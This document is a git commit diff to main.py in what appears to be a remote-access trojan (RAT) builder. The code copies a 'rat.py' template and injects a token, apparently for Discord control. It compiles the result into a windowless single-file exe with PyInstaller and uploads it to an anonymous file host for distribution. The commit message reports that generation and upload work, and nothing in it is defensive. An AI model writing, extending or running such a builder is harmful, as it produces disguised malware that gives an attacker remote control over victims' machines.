de47c1a79ed2ab3a7d613aa7d19b6cc1b5ecea1c
ryane-joe <125251551+ryane-joe@users.noreply.github.com>
2023-04-01 00:57:56 +0530

    generation is complete upload works, exe works
    ive completed quite  a bit, i think i just need to make it work w a discrd bot to finish the base app

--- main.py
+++ main.py
@@ -3,32 +3,23 @@ import shutil
 from pathlib2 import Path
 import PyInstaller
 import os
-
+#TODO dc config
 def upload(filepath):
     file_up = AnonFile()
     up = file_up.upload(filepath)
-    print(up.url.geturl())
+    return str(up.url.geturl())
 #TODO  try running this on a vm to fix the OSerror to try debug
-def create_executable(py_file):
-    py_file = os.path.abspath(py_file)
-    output_dir = os.path.dirname(py_file)
-    spec_file = os.path.join(output_dir, 'output.spec')
-    PyInstaller.__main__.run([
-        '--name=output',
-        '--onefile',
-        '--specpath={}'.format(output_dir),
-        '--distpath={}'.format(output_dir),
-        '--workpath={}'.format(output_dir),
-        py_file,
-    ])
-    os.remove(spec_file)
-src = r'ratter.py'
-dest = 'hi.py'
-path = shutil.copyfile(src,dest)
-file = Path(r'hi.py')
-data = file.read_text()
-re = 'token'
-sr = '#Enteer'
-data = data.replace(sr,re)
-file.write_text(data)
-create_executable('hi.py')
+def gen(token):
+    src = r'rat.py'
+    dest = 'hi.py'
+    path = shutil.copyfile(src,dest)
+    file = Path(r'hi.py')
+    data = file.read_text()
+    sr = '#Enteer'
+    data = data.replace(sr,token)
+    file.write_text(data)
+    os.system("python -m PyInstaller --onefile --windowed --hidden-import=discord hi.py")
+    print(upload(r'dist/hi.exe'))
+    
+gen('tkn')
+
